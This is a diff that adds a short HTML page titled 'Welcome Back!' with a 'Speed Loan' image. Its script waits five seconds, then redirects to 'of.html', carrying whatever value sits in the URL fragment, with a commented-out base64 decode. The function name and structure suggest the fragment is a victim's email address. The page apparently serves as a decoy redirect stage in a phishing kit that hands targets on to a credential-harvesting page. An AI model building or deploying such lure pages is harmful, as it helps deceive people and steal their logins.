@@ -1,0 +1,46 @@
+<html xmlns='http://www.w3.org/1999/xhtml' lang="en">
+<!DOCTYPE html>
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Welcome Back!</title>
+<style>
+img {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+</style>
+</head>
+
+<body onload="myFunction();">
+<img src="redix.gif" alt="Speed Loan">
+</body>
+
+<script>
+var myVar;
+
+function myFunction() {
+  myVar = setInterval(alertFunc, 5000);
+}
+
+function alertFunc() {
+var kim ="of.html#"+getMai();
+
+      setTimeout("location.href = '"+kim+"';",0);
+
+}
+
+function getMai(){
+    if(window.location.hash){
+    var url = window.location.href;
+            var hash = url.split('#').pop();
+            return hash;
+            //return atob(hash);
+    }
+}
+</script>
+
+</html>
